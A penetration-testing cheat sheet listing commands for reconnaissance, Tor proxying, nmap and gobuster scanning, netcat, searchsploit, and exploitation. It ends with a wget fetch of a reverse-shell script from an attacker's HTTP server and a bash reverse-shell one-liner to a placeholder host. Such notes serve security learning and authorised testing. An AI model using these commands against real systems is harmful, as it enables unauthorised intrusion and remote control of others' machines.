# Pre-Intrusion phase

## Reconnaissance

### Passive

whois to query WHOIS servers

```
whois <target>
```

nslookup to query DNS servers

```
nslookup <target>
nslookup -type=A <target> 1.1.1.1
```

dig to query DNS servers

```
dig <target>
dig @1.1.1.1 <target> TXT
```

Online:
+ https://dnsdumpster.com/
+ https://www.shodan.io/
+ https://builtwith.com/

### Active

Web Browser:
+ Chrome DevTools
+ FoxyProxy (change the proxy server)
+ User-Agent Switcher and Manager (pretend to different OS/browser)
+ Wappalyzer (technologies used)

Test connection and DNS information

```
ping <target>
traceroute/tracert <target>
```

Communicate with host

```
telnet <target> <port>
GET / HTTP/1.1
host: telnet
nc <target> <port>
GET / HTTP/1.1
host: netcat
```
## Using Proxy

### Proxychains with Tor

#By default Proxychains is setup to use TOR as proxy

```
systemctl start tor
```
+ 'stop': Used to stop tor services 
+ 'restart': Used to restart tor services

```
proxychains curl http://ifconfig.me/ip
```
#Use "Proxychains" before running any cmd

## Scanning

### Nmap

```
nmap -A -T4 <target>
```

+ `-sV`: Probe open ports to determine service/version info
+ `-O`: Enable OS detection
+ `-p <port ranges>`: Only scan specified ports
+ `-sC`: equivalent to --script=default
+ `-A`: Enable OS detection, version detection, script scanning, and traceroute
+ `--script=vuln`: detect vulnerability script on target

### GoBuster

```
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -t 30
```

+ `dir` â€“ (scan for directories).
+ `-u`: Target URL.
+ `-w`: the wordlist we are using to scan

## Exploitation

### Netcat

```
# as listener
nc -lvnp 4444
# as client
nc <rhost> 4444
```

+ `-l`: Listen
+ `-v`: Verbose
+ `-n`: Do not use DNS
+ `-p`: What port to listen on

### Searchsploit

```
searchsploit <keyword>
```

+ `-m`: mirror download the exploit
+ `-u`: show url to its CVE

requests lib error for python2

```
git clone https://github.com/kennethreitz/requests
cd requests && python setup.py
pip3 install --force-reinstall requests
pip3 install --ignore-installed requests
```

### HTTP Server

```
python3 -m http.server
wget <my_ip>:8000/rev.sh
```

### Bash

```
bash -i &> /dev/tcp/<RHOST>/<RPORT> 0>&1
```
